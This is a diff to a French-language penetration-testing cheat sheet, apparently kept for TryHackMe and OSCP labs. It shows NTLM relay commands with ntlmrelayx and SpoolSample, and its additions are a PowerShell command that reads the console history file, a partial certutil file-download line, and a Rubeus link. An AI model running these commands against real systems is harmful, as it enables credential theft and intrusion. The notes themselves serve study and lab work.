@@ -580,6 +580,9 @@
         SET UP NTLM RELAY
           python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
           SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
+
+    Voir console history powershell:
+        Get-Content %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
           
 #[BUFFER OVERFLOW]
 
@@ -637,6 +640,11 @@
 
     frackczip https://www.kali.org/tools/fcrackzip/
       pour cracker mdp des . zip
+
+    Download en powershell via certutil
+      certutil.exe -urlcache -split -f http://
+
+   
 #[HASH / DEHASH / DECODE]
 
     john --format=NT hash(hash est le nom du fichier)
@@ -668,6 +676,9 @@
     Github rapport pentest
       https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
       https://github.com/cyber-cfreg/Penetration-Test-Report-Template
+    
+    RUBEUS
+      https://github.com/GhostPack/Rubeus?tab=readme-ov-file#diamond
 
 #[PORT FORWARDING ET SSH TUNNEL]
 
